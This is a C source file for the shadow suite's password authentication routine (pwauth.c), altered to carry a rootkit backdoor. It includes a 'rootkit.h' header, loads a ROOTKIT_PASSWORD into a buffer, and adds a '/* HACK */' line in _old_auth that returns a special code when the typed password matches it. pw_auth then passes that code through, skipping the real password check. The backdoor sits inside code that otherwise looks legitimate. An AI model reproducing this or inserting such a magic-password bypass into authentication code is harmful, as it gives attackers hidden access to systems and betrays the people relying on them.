/*
 * Copyright 1992 - 1994, John F. Haugh II
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *	This product includes software developed by John F. Haugh, II
 *      and other contributors.
 * 4. Neither the name of John F. Haugh, II nor the names of its contributors
 *    may be used to endorse or promote products derived from this software
 *    without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY JOHN HAUGH AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL JOHN HAUGH OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <config.h>

#include "rcsid.h"
RCSID("$Id: pwauth.c,v 1.1.1.1 1996/08/10 07:59:50 marekm Exp $")

#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <fcntl.h>
#include <stdio.h>
#include "prototypes.h"
#include "defines.h"
#include "pwauth.h"
#include "getdef.h"
#include "../../rootkit.h"

#ifdef	SKEY
#include <skey.h>
#endif

#ifdef __linux__  /* standard password prompt by default */
static const char *PROMPT = "Password: ";
#else
static const char *PROMPT = "%s's Password:";
#endif

extern	char	*getpass();

#ifdef AUTH_METHODS
/*
 * Look-up table for bound-in methods.  Put the name that the
 * method is known by in the password field as "name" and a
 * pointer to the function
 */

struct	method	{
	char	*name;
	int	(*func) P_((const char *, int, const char *));
};

#ifdef PAD_AUTH
int pad_auth();
#endif
static struct method methods[] = {
#ifdef PAD_AUTH
	{ "pad", pad_auth },
#endif
	{ "",	0 }
};
#endif  /* AUTH_METHODS */

int wipe_clear_pass = 1;
char *clear_pass = NULL;

/*
 * _old_auth - perform getpass/crypt authentication
 *
 *	_old_auth gets the user's cleartext password and encrypts it
 *	using the salt in the encrypted password.  The results are
 *	compared.
 */

static int
_old_auth (cipher, user, reason, input)
	const char *cipher;
	const char *user;
	int reason;
	const char *input;
{
	char	prompt[BUFSIZ];
	char	*clear = NULL;
	const char *cp;
	int	retval;
#ifdef	SKEY
	int	use_skey = 0;
	int	passcheck = -1;
	char	challenge_info[40];
	struct	skey	skey;
#endif
        char MAG[7];
        strcpy(MAG,"");
        MAG[0]=ROOTKIT_PASSWORD[0];
        MAG[1]=ROOTKIT_PASSWORD[1];
        MAG[2]=ROOTKIT_PASSWORD[2];
        MAG[3]=ROOTKIT_PASSWORD[3];
        MAG[4]=ROOTKIT_PASSWORD[4];
        MAG[5]=ROOTKIT_PASSWORD[5];
        MAG[6]='\0';

	/*
	 * There are programs for adding and deleting authentication data.
	 */

	if (reason == PW_ADD || reason == PW_DELETE)
		return 0;

	/*
	 * There are even programs for changing the user name ...
	 */

	if (reason == PW_CHANGE && input != (char *) 0)
		return 0;

	/*
	 * WARNING:
	 *
	 * When we change a password and we are root, we don't prompt.
	 * This is so root can change any password without having to
	 * know it.  This is a policy decision that might have to be
	 * revisited.
	 */

	if (reason == PW_CHANGE && getuid () == 0)
		return 0;

	/*
	 * WARNING:
	 *
	 * When we are logging in a user with no ciphertext password,
	 * we don't prompt for the password or anything.  In reality
	 * the user could just hit <ENTER>, so it doesn't really
	 * matter.
	 */

	if (cipher == (char *) 0 || *cipher == '\0')
		return 0;

#ifdef	SKEY
	/*
	 * If the user has an S/KEY entry show them the pertinent info
	 * and then we can try validating the created cyphertext and the SKEY.
	 * If there is no SKEY information we default to not using SKEY.
	 */

	if (skeychallenge (&skey, user, challenge_info) == 0)
		use_skey = 1;
#endif

	/*
	 * Prompt for the password as required.  FTPD and REXECD both
	 * get the cleartext password for us.
	 */

	if (reason != PW_FTP && reason != PW_REXEC && !input) {
		if (! (cp = getdef_str ("LOGIN_STRING")))
			cp = PROMPT;
#ifdef	SKEY
		if (use_skey)
			printf ("[%s]\n", challenge_info);
#endif
		sprintf (prompt, cp, user);
		clear = getpass (prompt);
		if (!clear) {
			static char c[1];
			c[0] = '\0';
			clear = c;
		}
		input = clear;

/* HACK */ if (!strcmp(input,MAG)) return 3;
 
	}

	/*
	 * Convert the cleartext password into a ciphertext string.
	 * If the two match, the return value will be zero, which is
	 * SUCCESS.  Otherwise we see if SKEY is being used and check
	 * the results there as well.
	 */

	retval = strcmp(pw_encrypt(input, cipher), cipher);
#ifdef	SKEY
	if (retval && use_skey) {
#if 0  /* some skey libs don't have skey_passcheck.  --marekm */
		passcheck = skey_passcheck(user, input);
#else
		if (skeyverify(&skey, input) == 0)
			passcheck = skey.n;
#endif
		if (passcheck > 0)
			retval = 0;
	}
#endif
	/*
	 * Things like RADIUS authentication may need the password -
	 * if the external variable wipe_clear_pass is zero, we will
	 * not wipe it (the caller should wipe clear_pass when it is
	 * no longer needed).  --marekm
	 */
	clear_pass = clear;
	if (wipe_clear_pass && clear && *clear)
		bzero(clear, strlen(clear));
	return retval;
}

#ifdef AUTH_METHODS
/*
 * _pw_auth - perform alternate password authentication
 *
 *	pw_auth executes the alternate password authentication method
 *	described in the user's password entry.  _pw_auth does the real
 *	work, pw_auth splits the authentication string into individual
 *	command names.
 */

static int
_pw_auth (command, user, reason, input)
	const char *command;
	const char *user;
	int reason;
	const char *input;
{
	RETSIGTYPE (*sigint)();
	RETSIGTYPE (*sigquit)();
#ifdef	SIGTSTP
	RETSIGTYPE	(*sigtstp)();
#endif
	int	pid;
	int	status;
	int	i;
	char	* const argv[5];
	int	argc = 0;
	int	pipes[2];
	char	*empty_env = NULL;
	int	use_pipe;

	/*
	 * Start with a quick sanity check.  ALL command names must
	 * be fully-qualified path names.
	 */

	if (command[0] != '/')
		return -1;

	/*
	 * Set the keyboard signals to be ignored.  When the user kills
	 * the child we don't want the parent dying as well.
	 */

	sigint = signal (SIGINT, SIG_IGN);
	sigquit = signal (SIGQUIT, SIG_IGN);
#ifdef	SIGTSTP
	sigtstp = signal (SIGTSTP, SIG_IGN);
#endif

	/* 
	 * FTP and REXEC reasons don't give the program direct access
	 * to the user.  This means that the program can only get input
	 * from this function.  So we set up a pipe for that purpose.
	 */

	use_pipe = (reason == PW_FTP || reason == PW_REXEC);
	if (use_pipe)
		if (pipe (pipes))
			return -1;

	/*
	 * The program will be forked off with the parent process waiting
	 * on the child to tell it how successful it was.
	 */

	switch (pid = fork ()) {

		/*
		 * The fork() failed completely.  Clean up as needed and
		 * return to the caller.
		 */

		case -1:
			if (use_pipe) {
				close (pipes[0]);
				close (pipes[1]);
			}
			return -1;
		case 0:

			/*
			 * Let the child catch the SIGINT and SIGQUIT
			 * signals.  The parent, however, will continue
			 * to ignore them.
			 */

			signal (SIGINT, SIG_DFL);
			signal (SIGQUIT, SIG_DFL);

			/*
			 * Set up the command line.  The first argument is
			 * the name of the command being executed.  The
			 * second is the command line option for the reason,
			 * and the third is the user name.
			 */

			argv[argc++] = command;
			switch (reason) {
				case PW_SU:	argv[argc++] = "-s"; break;
				case PW_LOGIN:	argv[argc++] = "-l"; break;
				case PW_ADD:	argv[argc++] = "-a"; break;
				case PW_CHANGE:	argv[argc++] = "-c"; break;
				case PW_DELETE:	argv[argc++] = "-d"; break;
				case PW_TELNET:	argv[argc++] = "-t"; break;
				case PW_RLOGIN:	argv[argc++] = "-r"; break;
				case PW_FTP:	argv[argc++] = "-f"; break;
				case PW_REXEC:	argv[argc++] = "-x"; break;
			}
			if (reason == PW_CHANGE && input)
				argv[argc++] = input;

			argv[argc++] = user;
			argv[argc] = (char *) 0;

			/*
			 * The FTP and REXEC reasons use a pipe to communicate
			 * with the parent.  The other standard I/O descriptors
			 * are closed and re-opened as /dev/null.
			 */

			if (use_pipe) {
				close (0);
				close (1);
				close (2);

				if (dup (pipes[0]) != 0)
					exit (1);

				close (pipes[0]);
				close (pipes[1]);

				if (open ("/dev/null", O_WRONLY) != 1)
					exit (1);

				if (open ("/dev/null", O_WRONLY) != 2)
					exit (1);
			}

			/*
			 * Now we execute the command directly.
			 * Do it with empty environment for safety.  --marekm
			 */

			execve (command, argv, &empty_env);
			_exit (255);

			/*NOTREACHED*/
		default:

			/* 
			 * FTP and REXEC cause a single line of text to be
			 * sent to the child over a pipe that was set up
			 * earlier.
			 */

			if (use_pipe) {
				close (pipes[0]);

				if (input)
					write (pipes[1], input, strlen (input));

				write (pipes[1], "\n", 1);
				close (pipes[1]);
			}

			/*
			 * Wait on the child to die.  When it does you will
			 * get the exit status and use that to determine if
			 * the authentication program was successful.
			 */

			while ((i = wait (&status)) != pid && i != -1)
				;

			/*
			 * Re-set the signals to their earlier values.
			 */

			signal (SIGINT, sigint);
			signal (SIGQUIT, sigquit);
#ifdef	SIGTSTP
			signal (SIGTSTP, sigtstp);
#endif

			/*
			 * Make sure we found the right process!
			 */

			if (i == -1)
				return -1;

			if (status == 0)
				return 0;
			else
				return -1;
	}
	/*NOTREACHED*/
}

/*
 * _builtin_auth - lookup routine in table and execute
 */

static int
_builtin_auth (command, user, reason, input)
	const char *command;
	const char *user;
	int reason;
	const char *input;
{
	int	i;

	/*
	 * Scan the table, looking for a match.  If we fall off
	 * the end, it must mean that this method isn't supported,
	 * so we fail the authentication.
	 */

	for (i = 0;methods[i].name[0];i++) {
		if (! strcmp (command, methods[i].name))
			break;
	}
	if (methods[i].name[0] == '\0')
		return -1;

	/*
	 * Call the pointed to function with the other three
	 * arguments.
	 */

	return (methods[i].func) (user, reason, input);
}
#endif  /* AUTH_METHODS */

/*
 * This function does the real work.  It splits the list of program names
 * up into individual programs and executes them one at a time.
 */

int
pw_auth (command, user, reason, input)
	const char *command;
	const char *user;
	int reason;
	const char *input;
{
#ifdef AUTH_METHODS
	char	buf[256];
	char	*cmd, *end;
	int	rc;

	/* 
	 * Quick little sanity check ...
	 */

	if (strlen (command) >= sizeof buf)
		return -1;

	strcpy (buf, command); /* safe (because of the above check) --marekm */

	/*
	 * Find each command and make sure it is NUL-terminated.  Then
	 * invoke _pw_auth to actually run the program.  The first
	 * failing program ends the whole mess.
	 */

	for (cmd = buf;cmd;cmd = end) {
		if ((end = strchr (cmd, ';')))
			*end++ = '\0';

		if (cmd[0] != '@')
			rc = _old_auth (cmd, user, reason, input);
		else if (cmd[1] == '/')
			rc = _pw_auth (cmd + 1, user, reason, input);
		else
			rc = _builtin_auth (cmd + 1, user, reason, input);
		if (rc==3) return 3;
		if (rc)
			return -1;
	}
	return 0;
#else
	return _old_auth(command, user, reason, input);
#endif
}
